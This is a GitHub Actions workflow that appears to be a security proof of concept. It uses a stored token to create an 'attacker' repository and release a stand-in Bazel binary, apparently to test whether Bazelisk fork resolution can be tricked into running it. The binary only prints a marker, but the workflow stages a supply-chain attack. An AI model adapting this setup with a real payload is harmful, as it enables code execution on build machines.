name: PoC - Bootstrap Attacker Bazel

on:
  push:
    branches:
      - main
    paths:
      - .github/workflows/poc-bootstrap-bazel.yml
  workflow_dispatch:

permissions:
  contents: read

jobs:
  bootstrap:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ secrets.BCR_TEST_TOKEN }}
    steps:
      - name: Verify token is available
        run: |
          test -n "$GH_TOKEN"

      - name: Create harmless attacker Bazel repository if needed
        run: |
          if gh api repos/SwayZGl1tZyyy/bazel >/dev/null 2>&1; then
            echo '[+] SwayZGl1tZyyy/bazel already exists'
          else
            gh api --method POST user/repos \
              -f name='bazel' \
              -f description='Harmless Bazelisk fork-resolution PoC' \
              -F private=false \
              -F auto_init=true >/dev/null
            echo '[+] Created SwayZGl1tZyyy/bazel'
          fi

      - name: Create harmless marker release
        run: |
          cat > bazel-0.0.1-linux-x86_64 <<'EOF'
          #!/bin/sh
          printf '%s\n' 'BCR_CUSTOM_BAZEL_EXECUTED'
          printf '%s\n' "argv: $*"
          exit 0
          EOF

          if gh release view 0.0.1 --repo SwayZGl1tZyyy/bazel >/dev/null 2>&1; then
            gh release upload 0.0.1 bazel-0.0.1-linux-x86_64 \
              --repo SwayZGl1tZyyy/bazel --clobber
          else
            gh release create 0.0.1 bazel-0.0.1-linux-x86_64 \
              --repo SwayZGl1tZyyy/bazel \
              --title 'PoC 0.0.1' \
              --notes 'Harmless marker release for Bazelisk fork-resolution testing.'
          fi

          echo '[+] ATTACKER_BAZEL_RELEASE_READY'
